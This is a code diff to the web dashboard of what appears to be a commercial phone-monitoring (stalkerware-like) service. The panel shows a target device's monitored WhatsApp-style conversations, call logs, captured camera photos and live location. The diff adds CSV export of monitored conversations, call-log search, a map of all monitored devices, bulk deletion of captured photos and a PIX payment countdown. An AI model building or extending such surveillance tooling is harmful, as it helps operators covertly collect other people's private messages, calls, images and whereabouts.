@@ -195,6 +195,26 @@
 @media(max-width:380px){
   .mp-plans-grid{grid-template-columns:1fr}
 }
+/* ── Disconnect banner ────────────────────────────────────────────── */
+.disconnect-banner{position:fixed;top:0;left:0;right:0;z-index:9999;background:#1e1e2e;border-bottom:2px solid #ff3838;color:#ff9090;font-size:.82rem;font-weight:600;padding:8px 16px;display:flex;align-items:center;justify-content:center;gap:8px;letter-spacing:.02em;box-shadow:0 2px 12px rgba(255,56,56,.25)}
+.disconnect-banner-error{background:#1a0a0a;border-color:#ef4444;color:#fca5a5}
+/* ── Call log search ──────────────────────────────────────────────── */
+.calllogs-search{background:var(--card-bg,#161622);border:1px solid rgba(255,255,255,.1);border-radius:8px;color:var(--text-primary,#e2e8f0);font-size:.8rem;padding:5px 10px;outline:none;width:140px}
+.calllogs-search::placeholder{color:rgba(255,255,255,.35)}
+.calllogs-search:focus{border-color:var(--neon-green,#39ff14)}
+/* ── CSV export button in messages panel ─────────────────────────── */
+.wa-export-btn{background:none;border:1px solid rgba(255,255,255,.12);border-radius:6px;color:#94a3b8;cursor:pointer;font-size:.75rem;padding:4px 8px;transition:all .2s}
+.wa-export-btn:hover{border-color:var(--neon-blue,#00d2ff);color:var(--neon-blue,#00d2ff)}
+/* ── All-devices map toggle ──────────────────────────────────────── */
+#btn-show-all-devices.active{background:rgba(255,153,0,.18);border-color:#ff9900;color:#ff9900}
+/* ── PIX countdown ───────────────────────────────────────────────── */
+.mp-pix-countdown{font-size:.78rem;color:#94a3b8;margin-top:6px;text-align:center}
+.mp-pix-countdown.urgent{color:#ef4444;font-weight:600}
+/* ── Photo bulk select ───────────────────────────────────────────── */
+.photo-select-overlay{position:absolute;inset:0;cursor:pointer;display:flex;align-items:flex-start;justify-content:flex-end;padding:6px}
+.photo-select-check{width:22px;height:22px;border-radius:50%;background:rgba(0,0,0,.55);border:2px solid rgba(255,255,255,.5);display:flex;align-items:center;justify-content:center;font-size:.75rem;color:#fff;font-weight:700;transition:all .15s}
+.gallery-photo-item.photo-selected .photo-select-check{background:var(--neon-blue,#00d2ff);border-color:var(--neon-blue,#00d2ff)}
+.gallery-photo-item.photo-selected img{outline:3px solid var(--neon-blue,#00d2ff);border-radius:4px}
 </style>
     <script>
       (function(){
@@ -207,6 +227,10 @@
     </script>
 </head>
 <body>
+    <!-- ── Disconnect banner — shown when WebSocket is down ───────────────── -->
+    <div id="disconnect-banner" class="disconnect-banner" style="display:none" role="alert">
+        🔴 Conexão perdida. Reconectando…
+    </div>
     <div class="app-container">
         <!-- Sidebar overlay (mobile only) -->
         <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>
@@ -474,6 +498,9 @@
                             <button id="btn-realtime-loc" class="btn-map-type" onclick="toggleRealtimeLocation()" title="Ativar localização em tempo real no aparelho">
                                 <i class="fa-solid fa-satellite-dish"></i> Ativar
                             </button>
+                            <button id="btn-show-all-devices" class="btn-map-type" onclick="toggleShowAllDevices()" title="Mostrar todos os dispositivos no mapa">
+                                <i class="fa-solid fa-mobile-screen-button"></i> Todos
+                            </button>
                         </div>
                     </div>
                     <div class="card-body map-container">
@@ -678,7 +705,11 @@
                 <div class="grid-card gallery-card" data-tab="media">
                     <div class="card-header">
                         <h3><i class="fa-solid fa-images neon-text-blue"></i> Galeria de Câmera</h3>
-                        <button class="btn btn-sm btn-clear-log" onclick="clearMediaType('photos')" title="Apagar todas as fotos"><i class="fa-solid fa-trash-can"></i> Limpar</button>
+                        <div style="display:flex;gap:6px;align-items:center;">
+                            <button id="btn-photo-select" class="btn btn-sm btn-secondary" onclick="togglePhotoSelectMode()" title="Selecionar para apagar"><i class="fa-solid fa-check-square"></i> Selecionar</button>
+                            <button id="btn-photo-delete-selected" class="btn btn-sm btn-danger" onclick="deleteSelectedPhotos()" style="display:none"><i class="fa-solid fa-trash-can"></i> Apagar Selecionadas</button>
+                            <button class="btn btn-sm btn-clear-log" onclick="clearMediaType('photos')" title="Apagar todas as fotos"><i class="fa-solid fa-trash-can"></i> Limpar</button>
+                        </div>
                     </div>
                     <div class="card-body photo-gallery" id="photo-gallery"><div class="empty-gallery-msg">Nenhuma foto capturada ainda.</div></div>
                 </div>
@@ -757,6 +788,7 @@
                                     <button class="wa-back-btn" onclick="waBackToList()"><i class="fa-solid fa-arrow-left"></i></button>
                                     <div class="wa-avatar" id="wa-avatar">?</div>
                                     <div class="wa-chat-info"><div class="wa-chat-name" id="wa-chat-name">Selecione uma conversa</div><div class="wa-chat-sub" id="wa-chat-sub">Mensagens monitoradas</div></div>
+                                    <button class="wa-export-btn" onclick="waExportConversation()" title="Exportar conversa em CSV"><i class="fa-solid fa-file-csv"></i> CSV</button>
                                 </div>
                                 <div class="wa-messages" id="wa-messages"><div class="wa-no-conv"><i class="fa-solid fa-comments fa-3x"></i><p>Selecione uma conversa à esquerda</p></div></div>
                                 <div class="wa-footer" id="wa-footer" style="display:none;"><input type="text" id="message-input" class="wa-input" placeholder="Enviar mensagem ao dispositivo..." maxlength="500" onkeydown="if(event.key==='Enter') sendMessage()"><button class="wa-send-btn" onclick="sendMessage()"><i class="fa-solid fa-paper-plane"></i></button></div>
@@ -794,7 +826,10 @@
                 <div class="grid-card calllogs-card" data-tab="calllogs">
                     <div class="card-header">
                         <h3><i class="fa-solid fa-phone-volume neon-text-green"></i> Registro de Ligações</h3>
-                        <button class="btn btn-sm btn-primary" onclick="syncCallLogs()"><i class="fa-solid fa-rotate-right"></i> Sync</button>
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <input class="calllogs-search" id="calllogs-search" type="text" placeholder="Buscar…" oninput="calllogsFilter(this.value)">
+                            <button class="btn btn-sm btn-primary" onclick="syncCallLogs()"><i class="fa-solid fa-rotate-right"></i> Sync</button>
+                        </div>
                     </div>
                     <div class="card-body calllogs-body" id="calllogs-body">
                         <div class="contacts-empty" id="calllogs-empty"><i class="fa-solid fa-phone fa-2x"></i><p>Selecione um dispositivo e clique em Sync</p></div>
@@ -1334,7 +1369,9 @@
   };
 
   window.histCopyCoords=function(lat,lng){
-    navigator.clipboard.writeText(`${lat.toFixed(6)},${lng.toFixed(6)}`).then(()=>alert('Coordenadas copiadas!')).catch(()=>{});
+    navigator.clipboard.writeText(`${lat.toFixed(6)},${lng.toFixed(6)}`)
+      .then(()=>{ if(typeof showToast==='function') showToast('Coordenadas copiadas!','success'); })
+      .catch(()=>{});
   };
 
   window.histExportCsv=function(){
@@ -1390,9 +1427,11 @@
 // ── Meu Plano ────────────────────────────────────────────────────────────────────────
 (function(){
   const AUTH = () => localStorage.getItem('ap_token') || '';
-  let mpSelectedPlan = null;
-  let mpPaymentId   = null;
-  let mpPollTimer   = null;
+  let mpSelectedPlan  = null;
+  let mpPaymentId    = null;
+  let mpPollTimer    = null;
+  let mpCountdownTimer = null;
+  let mpCountdownEnd   = 0;
 
   async function mpApi(method, path, body) {
     const opts = { method, headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + AUTH() } };
@@ -1488,6 +1527,28 @@
     mpPaymentId = result.paymentId;
     mpRenderPix(result);
     mpPollTimer = setInterval(mpPoll, 5000);
+    // Start 1-hour PIX expiry countdown (unless static PIX which has no TTL)
+    if (result.autoConfirm !== false) {
+      clearInterval(mpCountdownTimer);
+      mpCountdownEnd = Date.now() + 3600000;
+      mpCountdownTimer = setInterval(mpTickCountdown, 1000);
+    }
+  }
+
+  function mpTickCountdown() {
+    const el = document.getElementById('mpPixCountdown');
+    if (!el) { clearInterval(mpCountdownTimer); return; }
+    const rem = Math.max(0, mpCountdownEnd - Date.now());
+    if (rem === 0) {
+      clearInterval(mpCountdownTimer);
+      el.textContent = '⏰ Código expirado. Gere um novo pagamento.';
+      el.className = 'mp-pix-countdown urgent';
+      return;
+    }
+    const m = String(Math.floor(rem / 60000)).padStart(2, '0');
+    const s = String(Math.floor((rem % 60000) / 1000)).padStart(2, '0');
+    el.textContent = `⏱️ Código expira em ${m}:${s}`;
+    el.className = 'mp-pix-countdown' + (rem < 300000 ? ' urgent' : '');
   }
 
   function mpRenderPix(r) {
@@ -1510,12 +1571,15 @@
       ` : ''}
       <div class="mp-pix-status"><div class="dot"></div> Aguardando pagamento…</div>
       <div style="color:#64748b;font-size:.74rem;margin-top:8px">${hint}</div>
+      ${r.autoConfirm !== false ? '<div class="mp-pix-countdown" id="mpPixCountdown">⏱️ Calculando…</div>' : ''}
     `;
   }
 
   window.mpCopyPix = function() {
     const code = document.getElementById('mpPixCodeText')?.textContent || '';
-    navigator.clipboard.writeText(code).then(() => alert('Código copiado!')).catch(() => {});
+    navigator.clipboard.writeText(code)
+      .then(() => { if (typeof showToast === 'function') showToast('Código PIX copiado!', 'success'); })
+      .catch(() => {});
   };
 
   async function mpPoll() {
@@ -1525,6 +1589,8 @@
   }
 
   function mpShowSuccess() {
+    clearInterval(mpCountdownTimer);
+    clearInterval(mpPollTimer);
     const area = document.getElementById('mpPixArea');
     const succ = document.getElementById('mpSuccess');
     if (area) area.style.display = 'none';
@@ -1536,6 +1602,7 @@
     mpPaymentId = null;
     mpSelectedPlan = null;
     clearInterval(mpPollTimer);
+    clearInterval(mpCountdownTimer);
     document.getElementById('mpPayBox').style.display = 'none';
     document.querySelectorAll('.mp-plan-card').forEach(c => c.classList.remove('selected'));
     mpLoadStatus();
